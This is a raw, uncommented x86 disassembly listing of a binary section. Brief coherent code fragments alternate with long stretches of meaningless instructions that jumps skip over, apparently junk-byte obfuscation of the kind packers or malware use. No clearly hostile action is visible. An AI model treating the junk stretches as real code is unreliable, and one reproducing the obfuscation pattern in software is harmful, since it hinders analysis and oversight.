  402127:	jmp    0x402162
  402129:	inc    esi
  40212a:	and    DWORD PTR [ebp+ecx*2+0x18],eax
  40212e:	jnp    0x4021aa
  402130:	leave  
  402131:	clc    
  402132:	fsub   DWORD PTR [eax-0x3c2dd89d]
  402138:	dec    esp
  402139:	je     0x4020e6
  40213b:	xchg   BYTE PTR [ecx-0x71deffd8],dl
  402141:	mov    edi,0x62189c86
  402146:	das    
  402147:	xor    al,0x9b
  402149:	pop    esp
  40214a:	or     eax,0x3b9817dc
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	out    dx,al
  40216a:	sbb    BYTE PTR [esi+0x7e021ea1],ah
  402170:	jle    0x40216c
  402172:	jg     0x4021f2
  402174:	jle    0x4021c8
  402176:	fild   QWORD PTR [eax-0x4e6793ff]
  40217c:	xchg   edx,eax
  40217d:	xor    eax,0x5b6f661e
  402182:	inc    ebx
  402183:	or     BYTE PTR [eax],ch
  402185:	dec    DWORD PTR [esi+0x1692935d]
  40218b:	ins    BYTE PTR es:[edi],dx
  40218c:	push   0xa0d26b7b
  402191:	fwait
  402192:	adc    esp,esi
  402194:	or     al,0x6f
  402196:	lods   al,BYTE PTR ds:[esi]
  402197:	add    bl,cl
  402199:	push   ebx
  40219a:	shl    DWORD PTR [esi+edx*4+0x6d],0x80
  40219f:	nop
  4021a0:	retf   0x6917
  4021a3:	test   BYTE PTR [ebx+0x49],0x81
  4021a7:	pusha  
  4021a8:	nop
  4021a9:	xor    eax,0x7e67e0ce
  4021ae:	aad    0xec
  4021b0:	jbe    0x402228
  4021b2:	xchg   ebx,eax
  4021b3:	mov    bh,0x9a
  4021b5:	or     BYTE PTR [edi],cl
  4021b7:	jecxz  0x4021d4
  4021b9:	add    ecx,ebp
  4021bb:	dec    edi
  4021bc:	mov    esi,0xd9b4be6c
  4021c1:	xchg   BYTE PTR [ebp-0x8],ch
  4021c4:	or     eax,0x60d1cd0
  4021c9:	ins    DWORD PTR es:[edi],dx
  4021ca:	xor    BYTE PTR [ecx+0x76155a89],0xdb
  4021d1:	int3   
  4021d2:	or     cl,BYTE PTR [edx-0x7a202b38]
  4021d8:	das    
  4021d9:	or     DWORD PTR [edi-0x3c18dee2],0xe6ffc77e
  4021e3:	sub    eax,0x283e3834
  4021e8:	sub    al,BYTE PTR [ebx+0x613e0802]
  4021ee:	clc    
  4021ef:	pop    ebp
  4021f0:	icebp  
  4021f1:	cli    
  4021f2:	jnp    0x40223f
  4021f4:	adc    BYTE PTR [edi+eiz*8+0x6],ah
  4021f8:	outs   dx,BYTE PTR ds:[esi]
  4021f9:	mov    bh,0xd3
  4021fb:	or     ecx,esp
  4021fd:	pop    ss
  4021fe:	int    0x2b
  402200:	scas   al,BYTE PTR es:[edi]
  402201:	dec    esi
  402202:	shr    BYTE PTR [eax+eiz*8],cl
  402205:	aaa    
  402206:	xchg   esp,eax
  402207:	bound  ebx,QWORD PTR [edi]
  402209:	dec    eax
  40220a:	ficom  DWORD PTR [ebp-0x276b4f34]
  402210:	dec    esp
  402211:	sub    ch,BYTE PTR [edx]
  402213:	push   ss
  402214:	jl     0x402212
  402216:	mov    ebx,0x34621bb
  40221b:	add    eax,0x2b8760d0
  402220:	dec    esi
  402221:	inc    ebx
  402222:	jnp    0x402214
  402224:	pusha  
  402225:	ss jmp 0x4eb4:0x41bf21bc
  40222d:	push   ds
  40222e:	in     al,dx
  40222f:	lds    ebp,FWORD PTR [ecx+eax*2+0x15]
  402233:	into   
  402234:	jge    0x4021d3
  402236:	ins    DWORD PTR es:[edi],dx
  402237:	in     eax,dx
  402238:	and    ebx,DWORD PTR [edx]
  40223a:	jp     0x40226e
  40223c:	clc    
  40223d:	cmp    DWORD PTR [ebp+0x14],ebp
  402240:	dec    ecx
  402241:	fst    DWORD PTR [ebx+esi*1-0x2b]
  402245:	out    0x32,eax
  402247:	mov    eax,0x37f7c216
  40224c:	xor    eax,0xe077915
  402251:	lahf   
  402252:	and    DWORD PTR [ebp-0x21738209],ecx
  402258:	imul   edx,esp,0xd381f65
  40225e:	jns    0x40223e
  402260:	scas   eax,DWORD PTR es:[edi]
  402261:	xor    al,0x27
  402263:	stos   DWORD PTR es:[di],eax
  402265:	imul   esi,DWORD PTR [ebx+eax*1+0x195e5046],0xb4bd798d
  402270:	inc    edx
  402271:	mov    edi,0x90f7b4d6
  402276:	xchg   edx,eax
  402277:	mov    ebp,0x75c5c0c2
  40227c:	ds ret 
  40227e:	adc    al,0x90
  402280:	cmp    BYTE PTR [edx+0x2d],bl
  402283:	out    0xa3,eax
  402285:	ins    BYTE PTR es:[edi],dx
  402286:	jmp    0x21c4a4ca
  40228b:	cmp    ch,dh
  40228d:	cmp    edx,DWORD PTR [eax+0x425c29c9]
  402293:	data16 icebp 
  402295:	cld    
  402296:	inc    esp
  402297:	loopne 0x40226c
  402299:	jmp    0xff3123b2
  40229e:	sbb    BYTE PTR [edi-0x4b],ah
  4022a1:	pop    esi
  4022a2:	sbb    DWORD PTR [edx-0x60],ebx
  4022a5:	xchg   edx,eax
  4022a6:	ret    0xd357
  4022a9:	adc    DWORD PTR [edi],eax
  4022ab:	adc    ah,BYTE PTR [eax+0x52787832]
  4022b1:	add    ch,cl
  4022b3:	(bad)  
  4022b4:	mov    ah,0x42
  4022b6:	out    0x73,al
  4022b8:	mov    ds,eax
  4022ba:	test   DWORD PTR [ecx+0x7d0296b6],esi
  4022c0:	outs   dx,DWORD PTR ds:[esi]
  4022c1:	push   0x9dd0d22f
  4022c6:	pop    esp
  4022c7:	mov    edx,DWORD PTR [ebx+0x61]
  4022ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022cb:	repnz call 0x7427:0x9733e5d
  4022d3:	in     al,dx
  4022d4:	call   0xf69:0xeb61b802
  4022db:	sub    dl,cl
  4022dd:	enter  0x8822,0x9b
  4022e1:	mov    esi,0xda54e06f
  4022e6:	jg     0x40235c
  4022e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022e9:	scas   al,BYTE PTR es:[edi]
  4022ea:	jmp    0x402310
  4022ec:	div    DWORD PTR [esi-0x63]
  4022ef:	xor    BYTE PTR [ebx-0x42da0868],dl
  4022f5:	sub    eax,0x5025c9d3
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	lds    esp,FWORD PTR [ecx]
  402359:	loop   0x40232e
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x402321
  402364:	les    eax,FWORD PTR [ebp+eiz*1+0x1b]
  402368:	xor    ch,BYTE PTR [ebp+0x1fe3746b]
  40236e:	lea    esi,ds:0x3ff4fc24
  402374:	fbld   TBYTE PTR [edi-0x70]
  402377:	idiv   dl
  402379:	mov    ah,0x9c
  40237b:	jo     0x4023c6
  40237d:	sub    bl,BYTE PTR [ebx-0x35580ec7]
  402383:	mov    ebp,0x1a4c51b6
  402388:	jb     0x4023ed
  40238a:	je     0x4023eb
  40238c:	ret    0x8f0e
  40238f:	sub    BYTE PTR [ecx-0xd],dh
  402392:	add    ebp,DWORD PTR [edi+edi*1+0x48]
  402396:	inc    ecx
  402397:	or     DWORD PTR [ebx+eiz*4],ecx
  40239a:	jnp    0x402390
  40239c:	and    esi,DWORD PTR [eax+0x24]
  40239f:	ins    BYTE PTR es:[edi],dx
  4023a0:	ret    
  4023a1:	pop    edi
  4023a2:	test   DWORD PTR [ebx],ebx
  4023a4:	or     DWORD PTR [ecx-0x1f0d7c77],ecx
  4023aa:	dec    edx
  4023ab:	or     edx,esi
  4023ad:	outs   dx,BYTE PTR ds:[esi]
  4023ae:	out    dx,al
  4023af:	retf   0x2a5
  4023b2:	loope  0x40238a
  4023b4:	arpl   WORD PTR [eax+edi*2],si
  4023b7:	cld    
  4023b8:	mov    esp,0x4d3ee2c3
  4023bd:	mov    esp,0x6af04731
  4023c2:	fdiv   DWORD PTR [ecx+0x5b]
  4023c5:	jbe    0x4023a0
  4023c7:	mov    dl,0x2e
  4023c9:	pushf  
  4023ca:	and    al,0x8d
  4023cc:	push   edx
  4023cd:	shr    BYTE PTR [eax-0x6bbb8faa],1
  4023d3:	dec    eax
  4023d4:	and    BYTE PTR ds:[ebp+0x3908012e],al
  4023db:	scas   eax,DWORD PTR es:[edi]
  4023dc:	imul   BYTE PTR [edi-0x26]
  4023df:	fadd   QWORD PTR [esp+ecx*1-0x42]
  4023e3:	jecxz  0x4023fd
  4023e5:	out    dx,al
  4023e6:	mov    ebp,0xb4e942f7
  4023eb:	xor    DWORD PTR [esi-0x2c],ebx
  4023ee:	mov    dl,0x79
  4023f0:	sub    ecx,DWORD PTR [edx]
  4023f2:	mov    ch,0x71
  4023f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023f5:	adc    BYTE PTR [edi+edi*4-0x7679c937],ah
  4023fc:	and    eax,0x8692444b
  402401:	dec    ecx
  402402:	leave  
  402403:	je     0x40242e
  402405:	sbb    dh,BYTE PTR [edx-0x45b7f75]
  40240b:	jnp    0x4023b5
  40240d:	call   0x8894:0x8b376413
  402414:	jbe    0x402484
  402416:	icebp  
  402417:	ins    DWORD PTR es:[edi],dx
  402418:	xchg   DWORD PTR [ebx+edi*2+0x65],esi
  40241c:	out    dx,al
  40241d:	cmp    BYTE PTR [edi-0x5ccbe9ed],bh
  402423:	das    
  402424:	jp     0x4023d5
  402426:	jae    0x40247f
  402428:	mov    si,0xdd59
  40242c:	mov    ah,0x63
  40242e:	xor    BYTE PTR ds:0xe350bc47,0x3f
  402435:	mov    al,ds:0xfa57e78
  40243a:	(bad)  [edx+0x7a9b27c9]
  402440:	imul   edi,DWORD PTR [esi-0x518cf35b],0x9e1906fa
  40244a:	ret    
  40244b:	inc    eax
  40244c:	outs   dx,DWORD PTR ds:[esi]
  40244d:	daa    
  40244e:	hlt    
  40244f:	sub    al,0x4f
  402451:	pop    ecx
  402452:	dec    edi
  402453:	std    
  402454:	or     ch,BYTE PTR [ebp-0x466cf65]
  40245a:	xchg   edx,eax
  40245b:	retf   
  40245c:	hlt    
  40245d:	inc    ebp
  40245e:	call   0x4f82e543
  402463:	mov    ecx,0x2d929576
  402468:	mov    dl,0x94
  40246a:	or     BYTE PTR [ebx+0x4b],bl
  40246d:	mov    ebx,0xe8612770
  402472:	test   DWORD PTR ds:0x557d8474,ecx
  402478:	(bad)  
  402479:	clc    
  40247a:	enter  0xebcd,0xa9
  40247e:	fild   DWORD PTR [ecx]
  402480:	sub    al,0x10
  402482:	call   FWORD PTR [eax]
  402484:	push   0x3b
  402486:	test   DWORD PTR [edx+esi*4-0x74d75d53],edi
  40248d:	push   ecx
  40248e:	inc    ebp
  40248f:	(bad)
  402494:	sbb    DWORD PTR [ebx+eax*4-0x72e65abf],0xbdcba6ac
  40249f:	inc    edx
  4024a0:	loope  0x4024ec
  4024a2:	sti    
  4024a3:	dec    edi
  4024a4:	stos   BYTE PTR es:[edi],al
  4024a5:	arpl   WORD PTR es:[edx-0x20],ax
  4024a9:	adc    ebx,DWORD PTR [esi-0xf]
  4024ac:	jae    0x40249d
  4024ae:	test   al,0x44
  4024b0:	xor    dh,al
  4024b2:	xlat   BYTE PTR ds:[ebx]
  4024b3:	ss push ebp
  4024b5:	leave  
  4024b6:	ins    BYTE PTR es:[edi],dx
  4024b7:	cmc    
  4024b8:	mov    ch,0x2d
  4024ba:	pop    ebx
  4024bb:	lock jecxz 0x402486
  4024be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024bf:	into   
  4024c0:	in     al,dx
  4024c1:	or     DWORD PTR [esi+0x617a5cc4],esi
  4024c7:	mov    al,ds:0xfe5b941
  4024cc:	fwait
  4024cd:	mov    ebp,0xefe42188
  4024d2:	sahf   
  4024d3:	push   edi
  4024d4:	shr    DWORD PTR [eax+0x34],0xcd
  4024d8:	daa    
  4024d9:	aaa    
  4024da:	and    al,0xe6
  4024dc:	retf   
  4024dd:	adc    al,0x62
  4024df:	(bad)  
  4024e0:	neg    BYTE PTR [edi]
  4024e2:	pop    edi
  4024e3:	(bad)  
  4024e4:	cmp    DWORD PTR [ecx+ebx*1-0x75],edi
  4024e8:	inc    ebp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	push   cs
  40250e:	paddd  mm6,QWORD PTR [edx+0x7e7e0126]
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x4024a0
  40251a:	fsub   st(2),st
  40251c:	mov    al,0x93
  40251e:	inc    DWORD PTR [ebp+0x415ec867]
  402524:	adc    eax,0xbf9d5af
  402529:	bound  ebp,QWORD PTR gs:[ebx-0x3a]
  40252d:	aas    
  40252e:	xchg   ebx,eax
  40252f:	into   
  402530:	cld    
  402531:	fnstcw WORD PTR [ebp-0x74af3d9d]
  402537:	mov    ebp,0x7dec78fc
  40253c:	add    DWORD PTR [ebp+ecx*4-0x1c72cbb5],edi
  402543:	dec    esi
  402544:	sbb    eax,0x2f4bfa52
  402549:	pop    edi
  40254a:	lods   eax,DWORD PTR ds:[esi]
  40254b:	mov    esi,0x1406cf5a
  402550:	and    dl,bl
  402552:	sub    DWORD PTR [edi],edi
  402554:	addr16 push ecx
  402556:	pop    ebp
  402557:	dec    ecx
  402558:	and    al,0xec
  40255a:	mov    WORD PTR ds:0x26c25c9b,es
  402560:	int3   
  402561:	mov    cl,0xfd
  402563:	outs   dx,DWORD PTR ds:[esi]
  402564:	scas   al,BYTE PTR es:[edi]
  402565:	ret    
  402566:	hlt    
  402567:	in     eax,dx
  402568:	jl     0x40250a
  40256a:	imul   ebp,ebx,0xc1eb6a56
  402570:	das    
  402571:	push   ebp
  402572:	nop
  402573:	leave  
  402574:	loopne 0x402592
  402576:	pop    ss
  402577:	aaa    
  402578:	out    dx,eax
  402579:	dec    esi
  40257a:	test   DWORD PTR [ebx],eax
  40257c:	int3   
  40257d:	dec    edi
  40257e:	cmp    ah,BYTE PTR [ecx-0x6b]
  402581:	daa    
  402582:	cmp    eax,DWORD PTR [edi-0x9]
  402585:	out    0x96,al
  402587:	xchg   ecx,eax
  402588:	inc    edx
  402589:	idiv   DWORD PTR cs:[edx]
  40258c:	cmc    
  40258d:	test   DWORD PTR [eax+0x5e],edi
  402590:	out    dx,al
  402591:	fcomp  QWORD PTR [eax-0x60ac18c9]
  402597:	imul   ebx,DWORD PTR [edi],0x6449c9c6
  40259d:	cmp    edx,esp
  40259f:	or     DWORD PTR [edx],ecx
  4025a1:	jns    0x40261e
  4025a3:	js     0x402548
  4025a5:	aaa    
  4025a6:	mov    BYTE PTR [eax-0x25166351],ah
  4025ac:	jno    0x40260c
  4025ae:	xor    BYTE PTR [esi],ah
  4025b0:	xchg   DWORD PTR [ebp-0x3],ebp
  4025b3:	mov    bh,0xff
  4025b5:	arpl   WORD PTR [edx+esi*1+0x6d],bx
  4025b9:	in     al,dx
  4025ba:	dec    esi
  4025bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025bc:	lea    ebx,[ebx]
  4025be:	jmp    0x40453e46
  4025c3:	test   esi,ebp
  4025c5:	(bad)  
  4025c7:	xlat   BYTE PTR ds:[ebx]
  4025c8:	xchg   DWORD PTR [ecx-0x3ca8266],esp
  4025ce:	mov    edx,0xd3f1c376
  4025d3:	popf   
  4025d4:	mov    edx,0x1093d837
  4025d9:	push   0xffffffbb
  4025db:	loopne 0x402649
  4025dd:	inc    edx
  4025de:	aad    0x54
  4025e0:	sbb    BYTE PTR [esp+edi*8],dh
  4025e3:	pop    es
  4025e4:	popf   
  4025e5:	outs   dx,BYTE PTR ds:[esi]
  4025e6:	mov    ecx,DWORD PTR [ebp+0x24945003]
  4025ec:	mov    ds:0xbfaf335b,eax
  4025f1:	repz mov al,0x7a
  4025f4:	mov    ds,WORD PTR [edi+ebx*1]
  4025f7:	adc    eax,0xac3513de
  4025fc:	cwde   
  4025fd:	add    DWORD PTR [edx-0x7be413e0],esp
  402603:	imul   esp,DWORD PTR [ecx-0x1bd15319],0x2a2b1e1
  40260d:	mov    ah,0x93
  40260f:	sub    al,0x7e
  402611:	dec    ebp
  402612:	or     ah,bl
  402614:	inc    esp
  402615:	jmp    0x1f57c337
  40261a:	enter  0xf30c,0x94
  40261e:	adc    DWORD PTR [ebx],0x8f525a2
  402624:	test   eax,0x5c4bbdae
  402629:	jnp    0x4025f4
  40262b:	les    ebx,FWORD PTR ds:0x3351df4a
  402631:	stos   DWORD PTR es:[edi],eax
  402632:	aad    0xb8
  402634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402635:	nop
  402636:	or     bl,BYTE PTR [eax+ebp*2]
  402639:	push   esi
  40263b:	dec    ebp
  40263c:	outs   dx,BYTE PTR ds:[esi]
  40263d:	sub    eax,DWORD PTR [ebx+0x4e852e9f]
  402643:	dec    ecx
  402644:	cld    
  402645:	ret    
  402646:	popf   
  402647:	xchg   edx,eax
  402648:	mov    edi,0x1de2d88e
  40264d:	sub    al,0xba
  40264f:	fmul   QWORD PTR [ecx+0x7c]
  402652:	cs dec esp
  402654:	jmp    ebp
  402656:	mov    eax,0x773aa3a0
  40265b:	push   ds
  40265c:	mov    dl,al
  40265e:	inc    eax
  40265f:	adc    BYTE PTR [esi-0x6260adaa],cl
  402665:	fs and dh,al
  402668:	popf   
  402669:	mov    esi,0xcc21fce1
  40266e:	add    al,0xbe
  402670:	sahf   
  402671:	out    0xa4,eax
  402673:	adc    ebp,DWORD PTR [ebp-0x8]
  402676:	xlat   BYTE PTR ds:[ebx]
  402677:	or     ebx,DWORD PTR [esi+0x27745a12]
  40267d:	sub    BYTE PTR [eax],bh
  40267f:	sbb    al,0xc4
  402681:	mov    gs,WORD PTR [eax-0x306d8b1c]
  402687:	mov    DWORD PTR [ecx],ecx
  402689:	add    edi,edx
  40268b:	out    dx,al
  40268c:	ds inc eax
  40268e:	daa    
  40268f:	nop    DWORD PTR [edx]
  402692:	mov    eax,ds:0xc04795a9
  402697:	daa    
  402698:	int    0xbd
  40269a:	pushf  
  40269b:	(bad)  
  40269c:	push   ecx
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	stos   DWORD PTR es:[edi],eax
  4026d3:	pop    ds
  4026d4:	(bad)  
  4026d5:	jo     0x402679
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026ef
  4026df:	test   ch,bl
  4026e1:	dec    edx
  4026e2:	pop    ecx
  4026e3:	cli    
  4026e4:	jmp    0xcec3ed1f
  4026e9:	in     eax,dx
  4026ea:	mov    ecx,fs
  4026ec:	mov    eax,ds:0xbb2c0986
  4026f1:	icebp  
  4026f2:	cmp    cl,bl
  4026f4:	mov    esi,DWORD PTR [ebx+ebp*1]
  4026f7:	popa   
  4026f8:	stos   DWORD PTR es:[edi],eax
  4026f9:	mov    cl,0x4e
  4026fb:	jne    0x4026fb
  4026fd:	enter  0xa9ed,0x90
  402701:	aam    0x25
  402703:	test   DWORD PTR [ebx+0x56],ebp
  402706:	sub    BYTE PTR [ebp-0x42],dh
  402709:	ror    BYTE PTR [edx-0x20],0xba
  40270d:	into   
  40270e:	popa   
  40270f:	jmp    0x1d29:0x995d0f90
  402716:	xor    BYTE PTR [edi],dh
  402718:	test   esi,0x7ea0d0f6
  40271e:	lock test BYTE PTR [eax],bh
  402721:	pop    ss
  402722:	inc    bh
  402724:	mov    ah,0xbd
  402726:	inc    eax
  402727:	mov    ds:0x1dc0499d,al
  40272c:	repz xchg esp,eax
  40272e:	xor    eax,0x5b8ca1c9
  402733:	std    
  402734:	std    
  402735:	mov    esi,edi
  402737:	retf   0x1d46
  40273a:	xor    DWORD PTR ds:0xf66ea7dd,esp
  402740:	mov    ecx,0xa2cf5800
  402745:	mov    ebp,esi
  402747:	push   es
  402748:	mov    ch,0x9b
  40274a:	pop    ebp
  40274b:	in     eax,dx
  40274c:	or     BYTE PTR [edi+0x3281a3c4],al
  402752:	and    DWORD PTR [ecx-0x17],eax
  402755:	adc    ah,cl
  402757:	ret    0xff12
  40275a:	sub    dh,BYTE PTR [ecx]
  40275c:	(bad)
  40275f:	push   ss
  402760:	sub    DWORD PTR ds:0x87ab1325,0x67
  402767:	aas    
  402768:	outs   dx,DWORD PTR ds:[esi]
  402769:	jg     0x4027e5
  40276b:	leave  
  40276c:	push   eax
  40276d:	ins    DWORD PTR es:[edi],dx
  40276e:	dec    esp
  40276f:	sbb    cl,BYTE PTR [esi]
  402771:	hlt    
  402772:	dec    ebp
  402773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402774:	loope  0x402761
  402776:	cmp    dh,bl
  402778:	(bad)  
  402779:	fimul  DWORD PTR [ebx-0x39e21839]
  40277f:	clc    
  402780:	jmp    0xafe3:0xed07aa24
  402787:	jmp    0x731c9565
  40278c:	sti    
  40278d:	add    ebx,DWORD PTR [ecx-0x49]
  402790:	aam    0x9a
  402792:	arpl   WORD PTR [ebx],sp
  402794:	or     DWORD PTR [ebx-0x35],edi
  402797:	lea    esi,[edx+0x39]
  40279a:	push   dx
  40279c:	fadd   QWORD PTR [ecx]
  40279e:	mov    DWORD PTR [ebx+0x44ce84f2],eax
  4027a4:	stos   DWORD PTR es:[edi],eax
  4027a5:	xchg   esi,eax
  4027a6:	(bad)  
  4027a7:	mov    ebp,0xb3cfe96d
  4027ac:	jns    0x402788
  4027ae:	add    ebp,0x25736bdf
  4027b4:	pop    eax
  4027b5:	sbb    al,0x88
  4027b7:	call   0x588c9aca
  4027bc:	stc    
  4027bd:	mov    edx,0xf2798bc5
  4027c2:	adc    edx,ebx
  4027c4:	sbb    ch,BYTE PTR [ecx]
  4027c6:	ror    DWORD PTR [ebx+0x27],0x4b
  4027ca:	pop    ecx
  4027cb:	test   eax,0x8c97148d
  4027d0:	test   BYTE PTR [edi],dh
  4027d2:	aaa    
  4027d3:	gs jbe 0x4027be
  4027d6:	or     BYTE PTR [eax+0x44],dh
  4027d9:	mov    eax,0x33c06c32
  4027de:	outs   dx,BYTE PTR ds:[esi]
  4027df:	jns    0x402769
  4027e1:	xor    BYTE PTR [edx+eax*4],bl
  4027e4:	xchg   esp,eax
  4027e5:	idiv   DWORD PTR [ebp-0x3736fa56]
  4027eb:	cdq    
  4027ec:	das    
  4027ed:	enter  0x96b4,0x4f
  4027f1:	mov    dl,0x51
  4027f3:	dec    esp
  4027f4:	das    
  4027f5:	fild   DWORD PTR [ecx-0x6e76d2d1]
  4027fb:	in     eax,dx
  4027fc:	mov    ah,0x6a
  4027fe:	pushf  
  4027ff:	mov    dl,0x15
  402801:	lahf   
  402802:	movups xmm5,xmm2
  402805:	adc    al,0x93
  402807:	pushw  0xffd6
  40280a:	lods   eax,DWORD PTR gs:[esi]
  40280c:	and    edx,DWORD PTR [edi-0x6af8addc]
  402812:	loope  0x402843
  402814:	adc    al,0x1d
  402816:	ja     0x402838
  402818:	push   cs
  402819:	ret    
  40281a:	shr    BYTE PTR [ebx],1
  40281c:	call   0x1ef3:0x80dd3f11
  402823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402824:	and    DWORD PTR [ebp+0x39edc55f],edi
  40282a:	fld    DWORD PTR [ecx-0x45c6b10e]
  402830:	mov    eax,ds:0xd2bfaff3
  402835:	neg    DWORD PTR [edx+0x1be41eee]
  40283b:	bound  edi,QWORD PTR [ebx+0x61]
  40283e:	xor    DWORD PTR [edx+0x72],esp
  402841:	pop    edx
  402842:	jo     0x4028bb
  402844:	repz loopne 0x402885
  402847:	mov    al,ds:0xae7090bd
  40284c:	sub    DWORD PTR [ecx],0x95a2e9d7
  402852:	sub    ah,0x17
  402855:	or     eax,0x90081f4f
  40285a:	sub    bh,ch
  40285c:	push   esi
  40285d:	jae    0x40284a
  40285f:	je     0x40284e
  402861:	mov    ds:0x8bd0458b,al
  402866:	dec    ebp
  402867:	clc    
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	test   eax,0x2eaa1678
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x40285b
  402890:	cmp    eax,DWORD PTR [ecx+0x2afe7584]
  402896:	cmp    cl,BYTE PTR [eax-0x7478aa90]
  40289c:	xchg   edi,eax
  40289d:	jp     0x402826
  40289f:	pop    edx
  4028a0:	fnsave [esi+0x4c]
  4028a3:	in     eax,dx
  4028a4:	sub    ebp,esi
  4028a6:	outs   dx,BYTE PTR ds:[esi]
  4028a7:	popa   
  4028a8:	test   ah,bl
  4028aa:	cli    
  4028ab:	xor    DWORD PTR [edx+0x5808967c],ebx
  4028b1:	scas   al,BYTE PTR es:[edi]
  4028b2:	or     al,0x68
  4028b4:	xchg   DWORD PTR [eax],edx
  4028b6:	dec    edi
  4028b7:	dec    ebp
  4028b8:	das    
  4028b9:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028bb:	stos   BYTE PTR es:[edi],al
  4028bc:	cdq    
  4028bd:	push   0x59
  4028bf:	into   
  4028c0:	jnp    0x4028d1
  4028c2:	pop    edi
  4028c3:	test   al,0x4
  4028c5:	in     al,dx
  4028c6:	dec    eax
  4028c7:	(bad)  
  4028c8:	ficomp DWORD PTR [eax+0x31]
  4028cb:	add    DWORD PTR es:[edi+0x76],edi
  4028cf:	ins    DWORD PTR es:[edi],dx
  4028d0:	mov    ds,WORD PTR [edx+0x2eb75b22]
  4028d6:	cdq    
  4028d7:	das    
  4028d8:	pop    ecx
  4028d9:	push   ss
  4028da:	shr    DWORD PTR ds:[ebp+0x34907efe],0x9
  4028e2:	inc    ebx
  4028e3:	jmp    0x8d98:0x5c62c239
  4028ea:	xor    al,0x3c
  4028ec:	int    0xb
  4028ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ef:	adc    BYTE PTR [edi+0x186f9c6d],dl
  4028f5:	popa   
  4028f6:	mov    ah,0x43
  4028f8:	test   eax,0xa9901af0
  4028fd:	stos   BYTE PTR es:[edi],al
  4028fe:	sub    BYTE PTR [eax],dl
  402900:	(bad)  
  402901:	loop   0x40290b
  402903:	addr16 push cs
  402905:	or     ebp,DWORD PTR [esi+0x51]
  402908:	es ror edx,0x32
  40290c:	xchg   eax,edx
  40290e:	adc    al,0x8f
  402910:	add    edi,DWORD PTR [edx+0x2dd303af]
  402916:	frstor [edx+0x11]
  402919:	dec    ecx
  40291a:	leave  
  40291b:	lds    edx,FWORD PTR [ebx+ecx*2-0x70e338a5]
  402922:	popf   
  402923:	inc    esp
  402924:	lods   al,BYTE PTR ds:[esi]
  402925:	sub    DWORD PTR [ebx+0x47ff411a],edi
  40292b:	dec    ecx
  40292c:	push   esi
  40292d:	and    al,0xf0
